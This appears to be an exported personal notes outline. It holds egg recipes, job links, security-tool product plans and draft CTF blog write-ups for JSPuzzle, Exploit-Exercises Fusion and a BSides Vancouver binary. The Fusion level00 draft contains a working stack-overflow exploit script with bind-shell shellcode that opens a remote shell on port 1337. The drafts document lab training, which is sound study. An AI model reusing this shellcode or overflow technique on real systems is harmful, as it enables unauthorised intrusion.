	  | Low Heat | Even though the yolk and white are insulated differently, the slow, steady heat of the pan will cause them to change temperature at nearly the same rate. This means we will see the yolk become completely firm and chalky before the egg white has a chance to become set. |
	  | Medium Heat | The egg yolk contains some amount of liquid on top, away from the heat of the pan, while the bottom, closer to the heat, has become firm. The white has become fully white and has started to brown. |
	  | High Heat | Egg whites become completely set, but because the yolk is well insulated, the heat has not had a chance to warm it up and so it is still all liquid. |
	  
	  While you can cook an egg in a perfectly smooth, non-stick pan, it is a good idea to use some sort of oil or butter to make sure the egg won't stick as well as add more flavor/texture.
	  
	  * Butter - Milk proteins will brown (more on browning [here](TODO)) and transfer to the egg giving it a rich taste
	  * Oil - Eggs are slightly more crispier, but with a cleaner taste.
	  
	  By using a shallow pool of oil with your eggs, you can spoon some of the oil on top of the eggs so that they are being cooked from all sides. This will help cook the egg whites quickly white protecting our precious yolk from becoming too firm.
	- #### Ingredients
	  * 2 large eggs
	  * 3 tbsp butter
	  * Function: fat
	  * Subs:
	  * olive oil
	  * Salt and pepper
	- #### Equipment
	  * Pan
	  * Surface: Non-stick
	  * Spoon
	  * Spatula
	  * Plate
	  * Optional: Paper towels
	- #### Directions
	  1. Heat fat in pan until...
	  * Observe: if using olive oil, you start to see whisps of smoke.
	  * Observe: if using butter, wait until the bubbling stops.
	  * Also: place a paper towel on the plate. This will help absorb the oil from the eggs once they are done.
	  2. Crack eggs carefully right over top of the surface of the pan so that the yolk is sitting comfortably on top of the white.
	  3. Tilt the pan, barely, so that the fat pools to one side.
	  4. Scoop the fat onto the egg whites until they are set and crispy.
	  * Time: 1 minute
	  5. Take the eggs out of the pan with a spatula and put them on the plate.
	- ### Scrambled Eggs
	- #### Concepts
	  
	  In any scrambled eggs recipe, the fatty egg yolk is first mixed together with the mainly protein white. While this mixture may seem simple, there are a number of moving parts which can greatly change the outcome. To understand how scrambled eggs can either be rich, dense, and creamy or light, slightly dry, and fluffy, it is important to consider the [chemistry of an egg](TODO) and [how water boils](TODO).
	  
	  We know that eggs contain a lot of water
	- #### Ingredients
	  * 6 large eggs
	  * 3/4 tsp kosher salt
	  * 2 tbsp unsalted butter
	  * Prep:
	  * cut into 1/4-inch cubes
	  * chilled
	  * 2 tbsp heavy cream
	  * Subs:
	  * creme fraiche)
	  * Optional: 2 large egg yolks
	- #### Equipment
	  * Bowl
	  * Size: medium
	  * Fork
	  * Rubber spatula
	  * Pan
	  * Surface: non-stick
	- #### Directions
	  1. Add eggs and salt to bowl.
	  * Optional: add egg yolks.
	  2. Whisk with fork until homogeneous and frothy.
	  * Time: 1 minute.
	  3. Optional: Wait 15 minutes.
	  4. Add butter to bowl.
	  5. Pour eggs into pan.
	  6. Heat pan to medium-low.
	  7. Stir pan.
	  * Rate: constantly.
	  * Until: butter completely melts.
	  * Observe: the eggs will become firmer and form into curds.
	  * Also: stir the eggs more rapidly when the curds form to make the eggs creamier.
	  8. Remove pan from heat.
	  9. Add heavy cream to pan.
	  10. Stir pan.
	  * Time: 15 seconds.
	  * Observe: Eggs should be tender and custardy. Hold their shape when piled up.
	- # TODO: Fill this out
	- ### Creme Fraiche
	- #### Concepts
	- #### Ingredients
	  * 2 cups heavy cream
	  * 2 tbsp buttermilk
	- #### Equipment
	  * Container
	  * Something to cover
	- #### Directions
	  1. Add heavy cream and buttermilk to container.
	  2. Cover.
	  3. Wait.
	  Until: Mixture has thickened.
	  Time: 6 - 12 hours
	- #### Storage
	  Location: Refrigerator
	  Duration: 2 weeks
	- ### Diner-Style Omelet
	- #### Concepts
	- #### Ingredients
	  * 5 large eggs
	  * 3/4 tsp kosher salt
	  * 1/4 tsp black pepper
	  * 2 tbsp unsalted butter
	  * 4 oz ham steak
	  * Prep: diced
	  * 2 oz cheddar cheese
	  * Prep: grated
	- #### Equipment
	  * Bowl
	  * Amount: 2
	  * Size: Medium
	  * Pan
	  * Surface: non-stick
	  * Lid
	  * Size: large enough to cover the pan
	  * Paper towels
	  * Silicone spatula
	  * Plate
	- #### Directions
	  1. Add eggs, salt, and black pepper to bowl
	  2. Whisk.
	  * Until: homogeneous and frothy
	  * Time: 1 minute
	  3. Optional: Wait.
	  * Time: 15 minutes
	  * Observe: Eggs will darken in color significantly.
	  4. Heat pan to medium.
	  5. Melt 1 tbsp unsalted butter in pan.
	  * Until: Butter is lighly browned.
	  6. Add ham to pan.
	  7. Stir pan.
	  * Rate: frequently
	  * Time: 3 minutes
	  * Until: Ham is browned on edges.
	  8. Transfer ham from pan to new bowl.
	  9. Add cheese to bowl with ham.
	  10. Stir cheese into ham.
	  11. Wipe out pan with paper towel.
	  12. Heat pan to medium heat.
	  13. Melt 1 tbsp unsalted butter in pan.
	  * Until: Butter is lighly browned.
	  14. Whisk eggs.
	  * Until: Eggs are foamy
	  15. Add eggs to skillet.
	  16. Using a silicone spatula, push edges of the egg toward the center of the pan as they set.
	  * Also: Tilt the pan to spread the uncooked egg underneath set egg.
	  * Until: All of the egg has almost all come set.
	  * Time: 45 seconds
	  17. Sprinkle ham and cheese over half of the omelet.
	  18. Remove from heat.
	  19. Cover pan with lid.
	  * Time: 1 minute.
	  * Until: Omelet has desired consistency.
	  20. Slide silicone spatula under the sides of the omelet to loosen it from the pan.
	  * Observe: The omelet should move freely when the pan is shook.
	  21. Fold the omelet in half.
	  22. Slide the omelet onto the plate.
	- #### Variations
	- # TODO: Diner-Style Mushroom, Pepper, and Onion Omelet
	- # TODO: Diner-Style Asparagus, Shallot, and Goat Cheese Omelet
	- # TODO: Knife Skills: How to Cut a Bell Pepper
	- ### Tender Fancy-Pants Omelet
	- #### Concepts
	- #### Ingredients
	  * 3 large eggs
	  * 1 large egg yolk
	  * 1/2 tsp kosher salt
	  * 1/4 tsp black pepper
	  * 1 tbsp whole milk
	  * Optional: Fillings
	  * 2 tbsp unsalted butter
	  * Prep:
	  * Cut into 1/4 inch cubes
	  * Chilled
	- #### Equipment
	  * Pan
	  * Surface: Non-stick
	  * Lid
	  * Size: large enough to cover the pan
	  * Bowl
	  * Size: Medium
	  * Whisk
	  * Subs:
	  * Fork
	  * Silicone spatula
	- #### Directions
	  1. Add eggs, egg yolk, salt, black pepper, milk, and fillings to bowl.
	  2. Whisk contents of bowl.
	  * Time: 1 minute
	  * Until: homogeneous and frothy
	  3. Optional: Wait.
	  * Time: 15 minutes
	  * Observe: Eggs will darken in color significantly.
	  4. Add 1 tbsp of butter to eggs.
	  5. Heat pan to medium.
	  6. Melt 1 tbsp unsalted butter in pan.
	  7. Add egg mixture to pan.
	  8. Immediately: Stir eggs with silicone spatula.
	  * Also: Scrape eggs off bottom of the pan.
	  * Time 2 minutes
	  * Rate: constantly
	  * Until: Firm enough to hold their shape when you draw a spatula through them.
	  9. Shake the pan to distribute the eggs evenly over the bottom pan.
	  10. Tilt the pan to a slight angle.
	  11. Rap pan against stove.
	  * Observe: eggs will be thicker on one side.
	  12. Remove pan from heat.
	  13. Cover pan with lid.
	  14. Wait.
	  * Time: 1 min 
	  * Until: Eggs are desired consistency.
	  15. Remove the lid.
	  16. Using a spatula, carefully roll the omelet.
	  * Note: Start from the thicker side, then tuck the ends under.
	  17. Turn the omelet out onto a plate.
	  * Note: It helps to hold the plate in one hand and the pan in the other.
	  18. Readjust shape.
	- #### Variations
	  
	  | Fillings | 	Prep |
	  |------------|-----------------|
	  | Young cheeses of all kinds (I like cheddar, Jack, blue, feta, Gruyère, Brie, and goat cheeses) | Grate or crumble. If using in conjunction with other cooked ingredients, toss with them in a small bowl after parcooking them; the residual heat will help start the melting process. |
	  | Hard grating cheeses like Parmigiano-Reggiano, Cotija, and Pecorino Romano | Grate on a Microplane and add to the raw eggs. |
	  | Cured meats like sausage, ham, and bacon | Cut into ½-inch pieces or nuggets and parcook in butter (let bacon cook in its own fat) until crisp on the edges and well browned. |
	  | Firm vegetables like onions, shallots, bell peppers, and hot peppers | Dice and soften in butter.
	  Tomatoes	Dice, salt, and drain. |
	  | Tender leafy vegetables like spinach and arugula | Sauté in butter, with a bit of minced garlic if desired. |
	  | Tender squashes like zucchini and summer squash | Sauté in butter. |
	  | Asparagus |	Cut into 1/4-inch slices on the bias and sauté in butter. |
	  | Scallions | Thinly slice whites and sauté in butter; thinly slice greens and incorporate into the filling or reserve for garnish. |
	  | Mushrooms | Slice thin and sauté in butter until the moisture has evaporated and the mushrooms are well browned. |
	  | Herbs | Add directly to the raw eggs. |
	- ### Bacon
	- #### Concepts
	- ##### Wet vs Dry Cure
	  TODO
	- #### Ingredients
	- #### Directions
	- #### Variations
	- ### Food
	- #### Concepts
	- #### Ingredients
	- #### Directions
	- #### Variations
	-
- #lunabrain/work
	- I just spent some time look up jobs, clicking through links, but the work that I did to uncover these things is all but lost because I can't extract it.
- #jobs/search
	- need to get my resume together
	- https://jobs.netflix.com/jobs/298140329 # Security Engineer (L5) - Third Party Security
	- OpenAI Software Engineer, Security Data Platform https://boards.greenhouse.io/openai/jobs/4953313004#app
	- https://boards.greenhouse.io/temporaltechnologies/jobs/4163461007
	- https://www.pinterestcareers.com/en/jobs/5526789/sr-security-engineer-product/?gh_jid=5526789
	- https://stripe.com/jobs/listing/backend-engineer-security-infrastructure/5448776
	- https://www.databricks.com/company/careers/security/sr-product-security-engineer--6710610002
	- https://jobs.lever.co/Anthropic/2051031c-8eb5-48da-83ed-d91ad368745c/apply
- #interviewing https://www.google.com/search?hl=en&q=louis%20theroux
- #bluetooth/recipeprinter
  collapsed:: true
	- [bmp encoder](https://github.com/hipstersmoothie/bmp-ts/blob/master/lib/encoder.ts)so that images can be sent in black and white to printer
	- [web bluetooth documentation mdn](https://developer.mozilla.org/en-US/docs/Web/API/Web_Bluetooth_API)
	- thermal printer arduino
		- [demo](https://github.com/bitbank2/Thermal_Printer/blob/master/examples/Thermal_Printer_Demo/Thermal_Printer_Demo.ino)
		- [sdk](https://github.com/bitbank2/Thermal_Printer/blob/master/src/Thermal_Printer.cpp)
	- [react native bluetooth - expo](https://expo.canny.io/feature-requests/p/bluetooth-1)
- #ethereum
  collapsed:: true
	- how to securely make contracts https://alchemy.com/blog/a-developers-guide-to-securing-ethereum-smart-contracts
	- state of blockchain security https://www.businesswire.com/news/home/20220113005054/en/CertiK-Releases-2021-State-of-DeFi-Security-Report
	- rinkeby testnet deprecated October 2, 2022
	- ..long live https://goerli.net/
- #lunasec
  collapsed:: true
	- using [semgrep](https://semgrep.dev/) to filter out dependencies that have never been called in code
	- write [snyk lockfile parser](https://github.com/lunasec-io/nodejs-lockfile-parser) as a go module to be used by a [syft cataloger](https://github.com/anchore/syft/blob/caff67289aead9a0ed1ec05c8534c3c440669e42/syft/pkg/cataloger/javascript/parse_package_lock.go)
		- this [golang graph package](https://pkg.go.dev/github.com/yourbasic/graph#Acyclic) might help
	- currently the [inserting of a parsed package lock](https://github.com/lunasec-io/lunasec/blob/master/lunatrace/bsl/backend/src/snapshot/node-package-tree.ts#L168) takes a long time, this could be optimized with an sql query formatted using a library like [zapatos](https://jawj.github.io/zapatos/#how-do-i-get-it)
	- for testing, a [local git server](https://gabrielcsapo.github.io/node-git-server/docs/intro/) could be helpful to avoid calling into github
	- * [The Evolving Community of Appsec - ASTHA SINGHAL](https://www.youtube.com/watch?v=pyX55cde3mY&t=628s)
	  * [Product Security lessons from Incident Response](https://www.youtube.com/watch?v=g8mF6pfo5BU)
	- ## LunaTrace
	- ### Meaningfully Managing Vulnerabilities and Malware for Fast Moving Teams
		- LunaTrace: Trace your code to the source
			- <img src="https://mermaid.ink/img/ICBmbG93Y2hhcnQgVEQKICAgIEFbVGFza10gLS0-IEJbRGV2ZWxvcGVyXQogICAgQiAtLT4gQ3tVc2UgYSBsaWJyYXJ5P30KICAgIEMgLS0-IHxZZXN8IERbSW1wb3J0IGxpYnJhcnldCiAgICBEIC0tPiBFW1B1bGwgUmVxdWVzdF0KICAgIEMgLS0-IHxOb3wgSFtXcml0ZSBjb2RlXQogICAgSCAtLT4gRQogICAgRSAtLT4gRltTb3VyY2UgQ29udHJvbF0KICAgIEYgLS0-IEdbQnVpbGRdCiAgICBHIC0tPiBJW0FydGlmYWN0IFJlcG9zaXRvcnldCiAgICBJIC0tPiBKW1J1bm5pbmcgaW4gUHJvZHVjdGlvbl0K" />
			  {{renderer :mermaid_azljpgref}}
				- ```mermaid 
				  flowchart TD
				      A[Task] --> B[Developer]
				      B --> C{Use a library?}
				      C --> |Yes| D[Import library]
				      D --> E[Pull Request]
				      C --> |No| H[Write code]
				      H --> E
				      E --> F[Source Control]
				      F --> G[Build]
				      G --> I[Artifact Repository]
				      I --> J[Running in Production]
				  ```
		- Every time a developer is working on a task, there is simple choice that they can make: "Do I solve this task with a library, or should I write the code myself?".
		- While a simple choice on the surface, there are a number of things that you should be considering, that maybe aren't so obvious.
			- Before installing that library, are you going to go look at the code?
		- LunaTrace: Automated Security Peer Review, with a personal touch
		- LunaTrace Proactive Resolution
		- LunaTrace Library Insight
			- npms.io score
			- https://www.phylum.io/ risk framework
			- snyk package score
		- LunaTrace Answers to Problems
			- Threat Model
				- Beyond Code: Before any code is even written, Lunatrace guides you in creating a threat model of your code. Does this service touch sensitive data? Answering simple questions like these will guide LunaTrace to provide security recommendations where they matter. It helps us stay out of your way while you do the important work.
			- Developer
				- Suggestions: Get an on-demand report of a package before adding. How many people use this package. Is this a strong package choice?
				- Proxy: Pull all packages through a proxy, configurable for your org, which can automatically sandbox
				- Pre-Commit: Enforce a policy for what packages to allow a developer to use based on the threat model for your organization
			- Pull Request
				- Peer Review: The LunaTrace CI bot reviews your PR to make suggestions about the packages that you have included.
			- Source Control
				- Stop the bleeding: Analyze the full state of the repository and understand where the bleeding needs to be stopped.
				- Active protection: When a package is added to the repository outside of the normal development flow (ie. no PR associated with a push)
			- Build
				- Proxy: Packages are blocked or modified to comply with the LunaTrace Library Insight policy
			- Artifact Repository
				- Compiled Coverage: Having visibility of compiled artifacts
			- Running in Production
				- Reporting: Always know where your weaknesses are. LunaTrace will identify everywhere that your code is running and identify all the packages it is using. Knowing not just what libraries you are using, but also where it is running helps LunaTrace prioritize what
	- [[LunaSec Mission]]
- #notetaking #gardens
  collapsed:: true
	- a pretty amazing thought garden [here](https://wiki.nikiv.dev/)
		- they also have a collection of [other thought gardens](other/wiki-workflow#similar-wikis-i-liked) they like
	- where you use a browser window to browse the internet, click open links, do your research. When you are done for the night, or want to context switch, you click a button to consolidate all of your open tabs into a single note. From there you can take notes on the saved links for future reference as well as context switch back to your browser session to resume your research. The note could be formatted in such a way that you can distinguished "opened" vs "closed" tabs:
	  ```
	  # opened
	  - google.com
	  - wikipedia.org
	  
	  # closed
	  - discord.gg
	  - instagram.com
	  ```
- #blog
  collapsed:: true
	- 2015-01-10-jspuzzle
		- If you want to try it yourself, you can download it here: <a href="https://github.com/ctfs/write-ups/tree/master/seccon-ctf-2014/jspuzzle" title="jspuzzle" target="_blank"> jspuzzle on github</a>
		- For the challenge, you were given a html page that presented you with a drag and drop form of code were specific parts of the code were blanked out and you must provide the form with the correct sequence of options from the provided bank of keywords/functions/strings. Once you were able to make the code execute and produce an alert with the value "1", the sha1 generated from the submitted options would represent the correct flag for the challenge.
		- What you have to realize here is that Javascript has a lot of crazy syntax that you can pull off and the difficult part is trying to understand what words from the word bank would produce runnable code.
		- The solution for this challenge ended up being:
		- {% highlight javascript lineanchors %}
		  "use strict";
		- ({ "function" : function() {
		  this[ "null" ] = (new Function( "return" + "/*^_^*/" + "this" ))();
		  var pattern = "^[w]$";
		  var r = new RegExp( pattern );
		  this[ r[ "exec" ]( pattern ) ][ "alert" ]( 1 );
		  }})[ "Function" [ "toLowerCase" ]() ]();
		  {% endhighlight %}
		- Which is just a round-about way of doing "alert(1)"
		- So lets break this down a little.
		- The first part of the code: "use strict;" is "a way to opt in to a restricted variant of JavaScript" ([strict mode](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Strict_mode)). Now this code will still run without that line so we can conclude that it was just there as another step for you :D
		- The main function part was pretty cool:
		  {% highlight javascript lineanchors %}
		  ({ "function" : function() {
		  this[ "null" ] = (new Function( "return" + "/*^_^*/" + "this" ))();
		  var pattern = "^[w]$";
		  var r = new RegExp( pattern );
		  this[ r[ "exec" ]( pattern ) ][ "alert" ]( 1 );
		  }})
		  {% endhighlight %}
		- <strong>An important thing that you must realize for this challenge is that Javascript indexes all its fields and functions in a key pair mapping. So something like `console.log()` can be rewritten as `console['log']()`</strong>
		- So when we do ({"key": value}) we are creating a Javascript Object which the last part of the code will actually access. So in this case we are creating js object with mapping "function" to an actual callable function.
		- {% highlight javascript lineanchors %}this["null"]{% endhighlight %}
		- will set the "null" field of the current function context, or <code>this</code>, to be the return value of the function created on the left side of the assignment.
		- {% highlight javascript lineanchors %}new Function( "return" + "/*^_^*/" + "this" ){% endhighlight %}
		- Javascript will create a new Function object by parsing the code given to the constructor, in this case our code will look like <code>return this</code>, which simply returns the current context of the function.
		- So we now have our null field of this referencing itself (what a great waste of time lol). The next two lines will create a Regex Javascript object with <code>"^[w]$"</code> which will only match the letter "w" (^ means that we start matching from the very beginning of the string and $ means we want the string to end with what we are matching. Since we are only matching the letter [w], "w" is the only possible string that would satisfy this regex).
		- {% highlight javascript lineanchors %}r[ "exec" ]( pattern ){% endhighlight %}
		- the code will now go to our r RegExp object and get the "exec" function (brackets in JS work similar to how they do in Python) and try to match our pattern string with "w". Since "^[w]$" != "w", exec will return null. Oh wait! Remember, we set this["null"] to be a function that returns "this" right? So since exec returns null we have
		- {% highlight javascript lineanchors %}this[null]["alert"](1){% endhighlight %}
		- which is the same as this["alert](1) which is the same as alert(1)! Sweet :D
		- For the last part,
		- {% highlight javascript lineanchors %}[ "Function" [ "toLowerCase" ]() ]();{% endhighlight %}
		- we can rewrite it as
		- {% highlight javascript lineanchors %}["Function".toLowerCase()](){% endhighlight %}
		- which is the same as
		- {% highlight javascript lineanchors %}["function"](){% endhighlight %}
		- and since this part is acting on the Object that we had in the previous part, we grab the function whose key is "function" (the alert function) and the parenthesis will execute this function.
		- Granted I was doing this with hindsight, it is still a simple, fun challenge to think differently about Javascript :D
	- 2015-01-20-fusion
		- This challenge is pretty much a straight forward stack overflow where you are using the fact that when we call real_path:
		  
		  {% highlight c lineanchors %}
		  int fix_path(char *path)
		  {
		    char resolved[128];
		    
		    if(realpath(path, resolved) == NULL) return 1; // can't access path. will error trying to open
		    strcpy(path, resolved);
		  }
		  {% endhighlight %}
		  
		  our `path` variable's size is controlled by our initial read in `parse_http_request`:
		  
		  {% highlight c lineanchors %}
		    char buffer[1024];
		    char* path;
		    ...
		    if(read(0, buffer, sizeof(buffer)) <= 0) errx(0, "Failed to read from remote host");
		    ...
		    path = &buffer[4];
		    ...
		    fix_path(path);
		  {% endhighlight %}
		  
		  as our `path` variable is simply a pointer to a location in `buffer` 4 bytes in. So looking up what `realpath` <a title="Realpath" href="http://man7.org/linux/man-pages/man3/realpath.3.html" target="_blank">does</a> we find that it will copy the given `path` string to our `resolved` buffer expanding any relative paths that we might have. `realpath` will also make sure that the file actually exists and if it doesn't it will return `NULL`. So for our sake we really don't care if we can access the `strcpy` because `realpath` will do the same thing for us!
		  
		  So now that we know what we are targeting, we need to make sure we pass the earlier checks to actually get to this point.
		  
		  {% highlight c lineanchors %}
		    ...
		    if(memcmp(buffer, "GET ", 4) != 0) errx(0, "Not a GET request"); // Is "GET " the first part of the given string?
		  
		    path = &buffer[4];
		    q = strchr(path, ' '); // After the "GET " string, is there another space?
		    if(! q) errx(0, "No protocol version specified"); // If not, throw an error
		    *q++ = 0; // Replace the space with a NULL character so we separate the path and protocol
		    if(strncmp(q, "HTTP/1.1", 8) != 0) errx(0, "Invalid protocol"); // Is the protocol == "HTTP/1.1"?
		    ...
		  {% endhighlight %}
		  
		  So from this we can deduce our payload is going to be something in the form of `GET <fill buffer><return address>; HTTP/1.1<nop sled><shellcode>;`. You can stick your shellcode in the nop sled but it is up to you :D Since we want $eip to point to our shellcode located some number of bytes away from the start of our buffer, we can start with using the buffer address that get leaked to us by the program and add some offset to get to our nop sled (the nop sled is optional here since we can really just calculate the exact offset but I was too lazy lol). Wiht some playing around in the binary you can find number of bogus characters to fill the buffer to be 139, after the 139th character, you will begin to overwrite the return address :D. Thus we would want our return address would be: buffer address + 139 + a few more to make sure we go past the return address that we stuck in there and onto the nop sled. Putting it all together we get:
		  
		  {% highlight python lineanchors %}
		  import sys
		  from os.path import expanduser
		  home = expanduser("~")
		  sys.path.append(home + "/Template")
		  from isis import *
		  
		  
		  #Allow time to attach debugger
		  debug = True
		  #change for local vs remote exploit
		  host = "172.16.76.131"
		  port = 20000
		  
		  #set up connection and set timeout 
		  def connect():
		  	s = get_socket((host,port))
		  	s.settimeout(0x1000000)
		  	return s
		  
		  s = connect()
		  if debug:
		  	raw_input("?")
		- # Shell Bind TCP Shellcode Port 1337 - 89 bytes - http://shell-storm.org/shellcode/files/shellcode-882.php
		  shellcode = "\x6a\x66\x58\x6a\x01\x5b\x31\xf6\x56\x53\x6a\x02\x89\xe1\xcd\x80\x5f\x97\x93\xb0\x66\x56\x66\x68\x05\x39\x66\x53\x89\xe1\x6a\x10\x51\x57\x89\xe1\xcd\x80\xb0\x66\xb3\x04\x56\x57\x89\xe1\xcd\x80\xb0\x66\x43\x56\x56\x57\x89\xe1\xcd\x80\x59\x59\xb1\x02\x93\xb0\x3f\xcd\x80\x49\x79\xf9\xb0\x0b\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x41\x89\xca\xcd\x80"
		  
		  
		  fill_buff = "A"*139 + lei(0xbffff8f8 + 170)
		  
		  payload = "GET "
		  payload += fill_buff
		  payload += " HTTP/1.1"
		  payload += "\x90" * 32
		  payload += shellcode
		  
		  s.send(payload)
		- # keeps connection open
		  telnet_shell(s)
		  {% endhighlight %}
		  
		  We then have a shell listening on port 1337 that we can nc into :D
		  
		  (I used a collection of helper functions from Blankwall's Template library. I encourage you to check it out: ([Github](https://github.com/blankwall/Template))
	- 2015-01-21-fusion
		- Challenge: <a href="https://exploit-exercises.com/fusion/level01/" title="Fusion Level01" target="_blank">here</a>
		- This level was pretty much the same code as the previous level, except we no longer have <a href="http://en.wikipedia.org/wiki/Address_space_layout_randomization" title="ASLR" target="_blank">ASLR</a> turned off and the address leak of our buffer is no longer available to us:
		- {% highlight c lineanchors %}
		  printf("[debug] buffer is at 0x%08x :-)\n", buffer); :D
		  {% endhighlight %}
		- While we really did not need this in the first challenge, because we could have used a dynamic debugger such as <a href="http://www.gnu.org/software/gdb/" title="gdb" target="_blank">gdb</a> to see where our buffer was in memory.
		- We do however, still have an executable stack. This tells us that we can still run our shellcode making our payload pretty similar to what it was in the previous level.
		- It would be really nice to be able to get the eip register to point to our shellcode... let's checkout what happens right before the function `fix_path` returns using gdb.
		- We start out by sshing into the fusion vm and startup gdb as root:
		- {% highlight bash lineanchors %}
		  [~]$ ssh fusion@<ip address of fusion vm>
		  fusion@172.16.76.131's password: 
		  fusion@fusion:~$ sudo gdb
		  (gdb) 
		  {% endhighlight %}
		- Making a little python script that uses sockets to establish a connection to the fusion vm on the same port that the level01 program is listening on (20001) we can run the program and then attach to the child process on the fusion vm:
		- {% highlight bash lineanchors %}
		  (gdb) shell pgrep level01
		- {% endhighlight %}
	- 2015-04-04-bsides-vancouver
		- files given:
		  
		  * delphi-07a5c9d07a4c20ae81a2ddc66b9602d0dcceb74b
		  * libtwenty.so-4a3918b2efd9fbdfd20eeb8fa51ca76bc42eb2f2
		  
		  TL;DR
		  
		  * Reverse Command Protocol
		  * Integer Overflow
		  * Metacharacter Injection
		  
		  First we identify what type of binary we are dealing with:
		  {% highlight bash lineanchors %}
		  ➜  yvr  file delphi
		  delphi: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.32, BuildID[sha1]=0x936b88708739382f1d376e89a4b82a4248d19b08, not stripped
		  {% endhighlight %}
		  
		  Running objdump -t delphi, we can see some symbols of the binary and from these we can conclude it is a compiled Golang program:
		  {% highlight bash lineanchors %}
		  ➜  yvr  objdump -t delphi | grep go
		  0000000000506920 l    d  .gopclntab	0000000000000000              .gopclntab
		  0000000000754ff0 l    d  .got	0000000000000000              .got
		  0000000000755000 l    d  .got.plt	0000000000000000              .got.plt
		  0000000000000000 l    df *ABS*	0000000000000000              _cgo_export.c
		  0000000000000000 l    df *ABS*	0000000000000000              main.cgo2.c
		  0000000000000000 l    df *ABS*	0000000000000000              _cgo_export.c
		  0000000000000000 l    df *ABS*	0000000000000000              cgo.cgo2.c
		  0000000000000000 l    df *ABS*	0000000000000000              /var/tmp/go-link-Sk9whB/go.o
		  00000000004f5138 l     O .rodata	0000000000000000              go.func.*
		  00000000004d37c0 l     O .rodata	0000000000000000              go.string.*
		  ...
		  {% endhighlight %}
		  
		  Now we have to make sure our system finds the libtwenty.so object file (just add the directory where you have libtwenty.so to the `LD_LIBRARY_PATH` environment variable):
		  {% highlight bash lineanchors %}
		  ➜  yvr  export LD_LIBRARY_PATH=$(pwd)
		  {% endhighlight %}
		  
		  So when we run this program, we are prompted with:
		  {% highlight bash lineanchors %}
		  ➜  yvr  ./delphi 
		  Welcome!
		  
		  Are you ready to play 20 questions? No? Perfect!
		  Im thinking of something big, metal, and orange. Go!
		  >
		  {% endhighlight %}
		  OK, so we have a place to input data... let's first look for a place we can latch onto:
		  
		  {% highlight nasm lineanchors %}
		  ➜  yvr  objdump -t delphi | grep main
		  0000000000000000 l    df *ABS*	0000000000000000              main.cgo2.c
		  0000000000504ff8 l     O .rodata	0000000000000008              runtime.main.f
		  00000000005050d0 l     O .rodata	0000000000000010              go.importpath.main.
		  000000000076d164 l     O .noptrbss	0000000000000001              main.initdone.
		  0000000000505ae0 l     O .rodata	0000000000000060              main.statictmp_0021
		  0000000000401280 l     F .text	00000000000009b0              main.main
		  0000000000401c30 l     F .text	00000000000001c0              main.doTheMagic
		  0000000000401df0 l     F .text	0000000000000070              main.init
		  00000000004021c0 l     F .text	0000000000000070              main._Cfunc_CString
		  0000000000402230 l     F .text	0000000000000040              main._Cfunc_check_answer
		  0000000000402270 l     F .text	0000000000000040              main._Cfunc_free
		  0000000000411b20 l     F .text	0000000000000170              runtime.main
		  0000000000000000       F *UND*	0000000000000000              __libc_start_main@@GLIBC_2.2.5
		  00000000004295b0 g     F .text	0000000000000010              main
		  {% endhighlight %}
		  
		  Alright so we found main (really main.main, since this is a Golang program), and we also found a function "main.doTheMagic", interesting... let's try to see if we can get there.
		  
		  We first find where our input is being read in:
		  {% highlight nasm lineanchors %}
		     0x401747 <main.main+1223>:	mov    QWORD PTR [rsp+0x48],rax
		     0x40174c <main.main+1228>:	mov    rbx,QWORD PTR [rsp+0x48]
		     0x401751 <main.main+1233>:	mov    QWORD PTR [rsp],rbx
		  => 0x401755 <main.main+1237>:	call   0x42cf70 <bufio.(*Scanner).Scan>
		     0x40175a <main.main+1242>:	movzx  rbx,BYTE PTR [rsp+0x8]
		     0x401760 <main.main+1248>:	cmp    bl,0x0
		     0x401763 <main.main+1251>:	je     0x4018b1 <main.main+1585>
		     0x401769 <main.main+1257>:	mov    rdi,QWORD PTR [rsp+0x48]
		  {% endhighlight %}
		  
		  If we continue to step (Whenever I debug, I can't help but think about Vampire Weekend's Step, naturally that is on a loop when I'm doing this :D), we end up here:
		  {% highlight nasm lineanchors %}
		  [----------------------------------registers-----------------------------------]
		  RAX: 0x2 
		  RBX: 0x4d7f60 --> 0x4d7f70 --> 0x6f67 ('go')
		  RDX: 0xa ('\n')
		  RSI: 0x4d7f70 --> 0x6f67 ('go')
		  RDI: 0xc208000270 ("TEST INPUT")
		  [-------------------------------------code-------------------------------------]
		     0x401939 <main.main+1721>:	mov    rax,QWORD PTR [rbx+0x8]
		     0x40193d <main.main+1725>:	mov    QWORD PTR [rsp+0x90],rdx
		     0x401945 <main.main+1733>:	mov    QWORD PTR [rsp+0xb0],rax
		  => 0x40194d <main.main+1741>:	cmp    rdx,rax                     ; Compares the length of "go" to our input
		     0x401950 <main.main+1744>:	jl     0x401baa <main.main+2346>   ; Go somewhere else if our input's length is < 2
		     0x401956 <main.main+1750>:	cmp    rdx,rax                     
		     0x401959 <main.main+1753>:	jb     0x401bb2 <main.main+2354>    
		     0x40195f <main.main+1759>:	mov    QWORD PTR [rsp+0xb8],rdi
		  {% endhighlight %}
		  
		  Alright, so it compares the length of our input to 2 and if it is smaller then it will presumablely quit. 
		  
		  Moving forward...
		  {% highlight nasm lineanchors %}
		  [----------------------------------registers-----------------------------------]
		  RAX: 0x2 
		  RSI: 0x4d7f70 --> 0x6f67 ('go')
		  RDI: 0xc208000270 ("TEST INPUT")
		  [-------------------------------------code-------------------------------------]
		     0x40197c <main.main+1788>:	mov    QWORD PTR [rsp+0x8],rax
		     0x401981 <main.main+1793>:	mov    QWORD PTR [rsp+0x10],rsi
		     0x401986 <main.main+1798>:	mov    QWORD PTR [rsp+0x18],rax
		  => 0x40198b <main.main+1803>:	call   0x425600 <runtime.eqstring>
		     0x401990 <main.main+1808>:	movzx  rbx,BYTE PTR [rsp+0x20]
		     0x401996 <main.main+1814>:	cmp    bl,0x0
		     0x401999 <main.main+1817>:	je     0x401baa <main.main+2346>
		     0x40199f <main.main+1823>:	mov    rax,0x1
		  {% endhighlight %}
		  
		  So it looks like the program checks to make sure the first two characters of the string are "go", so let's give that a try to see if anything different happens:
		  {% highlight bash lineanchors %}
		  ➜  yvr  ./delphi 
		  Welcome!
		  
		  Are you ready to play 20 questions? No? Perfect!
		  Im thinking of something big, metal, and orange. Go!
		  > go
		  Sneaky, sneaky. Go where? How fast?
		  > something else
		  Whos that?
		  > asdfasdf
		  Whos that?
		  > asdfasdfasd
		  Maybe? Hmmm.
		  > 
